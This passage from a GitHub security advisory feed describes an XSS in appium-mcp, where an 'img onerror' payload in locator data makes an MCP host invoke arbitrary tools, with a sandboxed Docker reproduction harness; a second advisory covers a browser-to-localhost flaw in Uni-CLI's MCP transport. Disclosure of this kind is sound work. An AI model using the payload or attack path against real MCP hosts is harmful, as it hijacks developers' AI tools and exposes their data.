<li>The injected <code>onerror</code> handler fires and posts a crafted <code>tool</code> message to the parent frame, causing the MCP host to invoke arbitrary registered tools (e.g., <code>appium_screenshot</code>, <code>execute_script</code>, <code>get_page_source</code>) without user confirmation.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>This is a <strong>Cross-Site Scripting (XSS)</strong> vulnerability. Any developer using <code>appium-mcp</code> with an MCP client that renders HTML resources (the intended workflow for the UI feature) is impacted when they inspect elements from an attacker-controlled application.</p>
<p><strong>Impact scenarios:</strong></p>
<ul>
<li><strong>Arbitrary MCP tool invocation:</strong> Injected JavaScript calls <code>window.parent.postMessage</code> with any tool name and parameters, executing MCP tools silently (e.g., taking screenshots, reading page source, executing scripts on the device).</li>
<li><strong>Credential and data exfiltration:</strong> Via <code>execute_script</code> or screenshot tools, an attacker can extract sensitive data visible on the device screen or in the page source.</li>
<li><strong>Lateral movement / persistence:</strong> If the MCP host exposes file-system or shell tools, the attacker can escalate to arbitrary code execution on the developer's machine.</li>
<li><strong>Supply-chain / CI abuse:</strong> Automated test pipelines that call <code>generate_locators</code> against third-party app builds are equally vulnerable; no human interaction beyond running the pipeline is required.</li>
</ul>
<p>The attack requires no authentication (<code>PR:N</code>), the tool is enabled by default (<code>default-on: Y</code>), and the scope is changed (<code>S:C</code>) because JavaScript executes in the MCP host frame rather than the sandboxed resource.</p>
<h3 id="reproduction-artifacts">Reproduction artifacts</h3>
<h4 id="dockerfile"><code>Dockerfile</code></h4>
<pre><code class="language-dockerfile"># VULN-001 PoC: Unescaped Locator Data XSS in appium-mcp createLocatorGeneratorUI
#
# Build context: reports/npmAI_303_appium__appium-mcp/
# (parent directory containing both repo/ and vuln-001/)
#
# Build:  docker build -t appium-mcp-vuln-001 -f vuln-001/Dockerfile .
# Run:    docker run --rm --network none appium-mcp-vuln-001

FROM node:20

WORKDIR /app

# Copy the vulnerable appium-mcp source tree
COPY repo/ ./

# Install all dependencies.
# --ignore-scripts skips postinstall hooks (native node-gyp builds) that
# are irrelevant for the TypeScript compilation we need.
# --no-audit / --no-fund suppress network noise.
RUN npm install --ignore-scripts --no-audit --no-fund 2&gt;&amp;1

# Compile TypeScript -&gt; JavaScript (dist/)
RUN npm run build

# Copy the PoC exploit script into the built app directory
COPY vuln-001/exploit.mjs ./exploit.mjs

# Default: run the XSS exploit proof-of-concept
ENTRYPOINT ["node", "exploit.mjs"]
</code></pre>
<h4 id="pocpy"><code>poc.py</code></h4>
<pre><code class="language-python">#!/usr/bin/env python3
"""
VULN-001 Dynamic PoC: Unescaped Locator Data XSS in appium-mcp createLocatorGeneratorUI

This script:
  1. Builds a Docker image containing the vulnerable appium-mcp source.
  2. Runs exploit.mjs inside the container with --network none (no outbound traffic).
  3. Parses the output to confirm the XSS payload survived unescaped into the HTML.
  4. Writes phase2_result.json with PASS/FAIL verdict and evidence.

Safety constraints:
  - Uses local Docker only (no external services).
  - Network is disabled in the container (--network none).
  - No live Appium session, no real device, no real credentials.
  - The repo source is not modified; the vulnerability is in the original code.
"""

import json
import os
import subprocess
import sys

# ── Paths ─────────────────────────────────────────────────────────────────────
VULN_DIR    = os.path.dirname(os.path.abspath(__file__))
CONTEXT_DIR = os.path.dirname(VULN_DIR)   # parent: npmAI_303_appium__appium-mcp/
DOCKERFILE  = os.path.join(VULN_DIR, "Dockerfile")
RESULT_PATH = os.path.join(VULN_DIR, "phase2_result.json")

IMAGE_NAME  = "appium-mcp-vuln-001"

BUILD_CMD = (
    f"docker build -t {IMAGE_NAME} "
    f"-f vuln-001/Dockerfile "
    f"{CONTEXT_DIR}"
)
RUN_CMD = f"docker run --rm --network none {IMAGE_NAME}"
POC_CMD = f"python3 {os.path.basename(__file__)}"


def run(cmd: list[str], timeout: int = 600) -&gt; tuple[int, str, str]:
    """Run a subprocess and return (returncode, stdout, stderr)."""
    result = subprocess.run(
        cmd,
        capture_output=True,
        text=True,
        timeout=timeout,
    )
    return result.returncode, result.stdout, result.stderr


def build_image() -&gt; tuple[bool, str]:
    """Build the Docker image. Returns (success, error_message)."""
    print("[*] Building Docker image (this may take several minutes for npm install)...")
    print(f"    {BUILD_CMD}\n")
    rc, stdout, stderr = run(
        ["docker", "build", "-t", IMAGE_NAME, "-f", DOCKERFILE, CONTEXT_DIR],
        timeout=600,
    )
    if rc != 0:
        tail = (stdout + stderr)[-3000:]
        print(f"[!] Build FAILED (exit {rc}):\n{tail}")
        return False, tail
    print("[*] Build succeeded.")
    return True, ""


def run_exploit() -&gt; tuple[int, str, str]:
    """Run the exploit container. Returns (returncode, stdout, stderr)."""
    print(f"\n[*] Running exploit container...")
    print(f"    {RUN_CMD}\n")
    rc, stdout, stderr = run(
        ["docker", "run", "--rm", "--network", "none", IMAGE_NAME],
        timeout=120,
    )
    print("--- container stdout ---")
    print(stdout)
    if stderr.strip():
        print("--- container stderr ---")
        print(stderr)
    return rc, stdout, stderr


def extract_evidence(stdout: str) -&gt; str:
    """Pull the most relevant lines from exploit output."""
    evidence_lines = []
    for line in stdout.splitlines():
        upper = line.upper()
        if any(kw in upper for kw in [
            "PASS", "FAIL", "CONFIRMED", "EVIDENCE",
            "UNESCAPED", "IMG SRC", "ONERROR",
            "TEXT PARAGRAPH", "CONTENTDESC", "RESOURCEID",
            "XSS",
        ]):
            evidence_lines.append(line)
    return "\n".join(evidence_lines) if evidence_lines else stdout[:2000]


def write_result(payload: dict) -&gt; None:
    with open(RESULT_PATH, "w", encoding="utf-8") as fh:
        json.dump(payload, fh, indent=2, ensure_ascii=False)
    print(f"\n[*] Result written to: {RESULT_PATH}")


def main() -&gt; None:
    # ── Build ──────────────────────────────────────────────────────────────────
    build_ok, build_err = build_image()
    if not build_ok:
        write_result({
            "passed": False,
            "verdict": "FAIL",
            "reason": (
                "Docker 이미지 빌드 실패. npm install 또는 TypeScript 컴파일 오류가 발생함. "
                "오류 메시지를 확인하여 누락된 패키지나 호환성 문제를 해결한 뒤 재시도 필요."
            ),
            "build_command": BUILD_CMD,
            "run_command": RUN_CMD,
            "poc_command": POC_CMD,
            "evidence": f"Build error (last 2000 chars):\n{build_err[-2000:]}",
            "artifacts": ["Dockerfile", "poc.py"],
        })
        sys.exit(1)

    # ── Run ────────────────────────────────────────────────────────────────────
    exit_code, stdout, stderr = run_exploit()

    # ── Verdict ────────────────────────────────────────────────────────────────
    xss_confirmed = (exit_code == 0) and ("XSS CONFIRMED" in stdout)
    evidence = extract_evidence(stdout)

    if xss_confirmed:
        write_result({
            "passed": True,
            "verdict": "PASS",
            "reason": (
                "컨테이너 내부에서 실제 실행을 통해 XSS 취약점이 확인됨. "
                "generateAllElementLocators()가 XML 속성의 &amp;lt;img&amp;gt; 엔티티를 "
                "원시 HTML 태그 &lt;img src=x onerror=...&gt;로 디코딩하고, "
                "createLocatorGeneratorUI()가 이를 HTML 이스케이프 없이 그대로 삽입함. "
                "MCP UI 렌더러(iframe/WebView)에서 해당 HTML을 렌더링하면 onerror 핸들러가 실행되어 "
                "window.parent.postMessage()를 통해 임의 MCP 도구를 호출할 수 있음."
            ),
            "build_command": BUILD_CMD,
            "run_command": RUN_CMD,
            "poc_command": POC_CMD,
            "evidence": evidence,
            "artifacts": ["Dockerfile", "poc.py"],
        })
        print("[PASS] XSS exploit confirmed.")
        sys.exit(0)
    else:
        reason_detail = (
            f"컨테이너 종료 코드: {exit_code}. "
            "'XSS CONFIRMED' 문자열이 출력에 없음. "
            "exploit.mjs 또는 Dockerfile을 확인하고 재시도 필요."
        )
        write_result({
            "passed": False,
            "verdict": "FAIL",
            "reason": reason_detail,
            "build_command": BUILD_CMD,
            "run_command": RUN_CMD,
            "poc_command": POC_CMD,
            "evidence": (stdout + "\n" + stderr)[:3000],
            "artifacts": ["Dockerfile", "poc.py"],
        })
        print(f"[FAIL] Exploit did not produce expected output (exit_code={exit_code}).")
        sys.exit(1)


if __name__ == "__main__":
    main()
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/appium/appium-mcp/security/advisories/GHSA-x975-rgx4-5fh4">https://github.com/appium/appium-mcp/security/advisories/GHSA-x975-rgx4-5fh4</a></li>
<li><a href="https://github.com/appium/appium-mcp/commit/e222bbbd6fe2b656a320efcd143563f08061a83d">https://github.com/appium/appium-mcp/commit/e222bbbd6fe2b656a320efcd143563f08061a83d</a></li>
<li><a href="https://github.com/appium/appium-mcp/releases/tag/v1.85.10">https://github.com/appium/appium-mcp/releases/tag/v1.85.10</a></li>
<li><a href="https://github.com/advisories/GHSA-x975-rgx4-5fh4">https://github.com/advisories/GHSA-x975-rgx4-5fh4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x975-rgx4-5fh4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-19T21:43:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@zenalexa/unicli] Uni-CLI: Legacy HTTP MCP transport accepted browser-originated localhost requests]]></title>
        <id>https://github.com/advisories/GHSA-v3f4-w7r7-v3hm</id>
        <link href="https://github.com/advisories/GHSA-v3f4-w7r7-v3hm"/>
        <updated>2026-06-19T21:43:11.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>Uni-CLI versions before 0.225.2 exposed the legacy JSON-RPC-over-HTTP MCP transport on loopback without validating browser Origin headers before routing requests. A malicious web page could send a CORS simple POST request, such as text/plain, to the local /mcp endpoint and deliver a JSON-RPC body to the dispatcher. If the user had started the local MCP HTTP transport, that page could drive tools/call requests against the user's local Uni-CLI server.</p>
<p>The Streamable HTTP transport already enforced this browser-to-localhost boundary. The legacy stateless HTTP path did not, so the two HTTP transports had drifted. This issue is about the browser-to-localhost boundary; it does not change Uni-CLI's local-code-execution trust model.</p>
<h2 id="patches">Patches</h2>
<p>Version 0.225.2 fixes the issue by moving the Origin policy into a shared guard and applying it before routing in both HTTP transports. Non-loopback browser Origins are rejected with HTTP 403 before health, OAuth, or /mcp dispatch runs. Non-browser clients that omit Origin remain supported.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Upgrade to 0.225.2 or later. If upgrading is not immediately possible, do not expose the legacy HTTP MCP transport to browser-originated traffic; use the default stdio transport or the Streamable HTTP transport instead.</p>
<h2 id="credits">Credits</h2>
<p>Reported privately by Ryan Vonbrubeck (<a href="https://github.com/dodge1218">@dodge1218</a>).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/olo-dot-io/Uni-CLI/security/advisories/GHSA-v3f4-w7r7-v3hm">https://github.com/olo-dot-io/Uni-CLI/security/advisories/GHSA-v3f4-w7r7-v3hm</a></li>
<li><a href="https://github.com/advisories/GHSA-v3f4-w7r7-v3hm">https://github.com/advisories/GHSA-v3f4-w7r7-v3hm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v3f4-w7r7-v3hm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-19T21:43:09.000Z</published>
    </entry>
</feed>